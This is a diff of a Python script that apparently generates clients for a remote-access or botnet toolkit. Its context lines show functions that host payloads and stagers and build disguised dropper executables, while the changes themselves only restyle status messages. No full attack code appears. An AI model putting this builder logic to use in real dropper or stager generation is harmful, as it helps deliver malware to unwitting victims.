@@ -188,7 +188,7 @@ def main():
 
 def _update(input, output, task=None):
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
-    util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')
+    util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='bright', color='reset')
 
 def _modules(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
@@ -213,7 +213,7 @@ def _modules(options, **kwargs):
                 module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                 modules.append(module)
     __load__.set()
-    util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
+    util.display("({} modules added to client)".format(len(modules)), color='reset', style='bright')
     return modules
 
 def _imports(options, **kwargs):
@@ -269,7 +269,7 @@ def _hidden(options, **kwargs):
                 hidden.add(i)
 
     globals()['__load__'].set()
-    util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
+    util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='bright')
     return list(hidden)
 
 def _payload(options, **kwargs):
@@ -331,7 +331,7 @@ def _payload(options, **kwargs):
         url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
-    util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
+    util.display("(hosting payload at: {})".format(url), color='reset', style='bright')
     return url
 
 def _stager(options, **kwargs):
@@ -386,7 +386,7 @@ def _stager(options, **kwargs):
         url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
-    util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
+    util.display("(hosting stager at: {})".format(url), color='reset', style='bright')
     return url
 
 def _dropper(options, **kwargs):
@@ -412,7 +412,7 @@ def _dropper(options, **kwargs):
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
         
-    util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
+    util.display('(saved to file: {})\n'.format(name), style='bright', color='reset')
     return name
 
 @util.threaded
